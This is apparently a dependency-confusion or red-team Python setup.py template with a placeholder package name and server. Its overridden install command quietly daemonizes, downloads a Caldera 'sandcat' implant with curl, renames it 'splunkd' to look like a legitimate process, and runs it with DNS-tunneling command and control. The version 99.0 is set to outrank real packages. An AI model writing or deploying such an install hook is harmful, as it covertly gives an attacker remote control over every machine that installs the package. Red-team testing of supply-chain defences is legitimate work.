#!/usr/bin/env python3

from distutils.core import setup
from distutils.command.install import install as _install
import os
import sys


package_name = 'placeholder'
server = 'placeholder'

class install(_install):
    def run(self):
        pid = os.fork()
        if(pid > 0):
            os.waitid(os.P_PID, pid, os.WEXITED)
            _install.run(self)
            return
        os.setsid()
        pid = os.fork()
        if pid > 0:
            os._exit(0)
        sys.stdout.flush()
        sys.stderr.flush()
        stdin = open(os.devnull, 'r')
        stdout = open(os.devnull, 'w')
        stderr = open(os.devnull, 'w')
        os.dup2(stdin.fileno(), sys.stdin.fileno())
        os.dup2(stdout.fileno(), sys.stdout.fileno())
        os.dup2(stderr.fileno(), sys.stderr.fileno())
        os.chdir('/tmp')
        os.system(f'curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:dns_tunneling" {server}/file/download > splunkd; chmod +x splunkd;')
        os.execl('./splunkd', './splunkd', '-c2', 'DnsTunneling', '-server', server, '-group', 'red')


setup(name=package_name,
      version='99.0',
      description='You have been owned!',
      author='Dylan Cao',
      author_email='dylan.v.cao@gmail.com',
      packages=[package_name],
      cmdclass={'install': install}
)

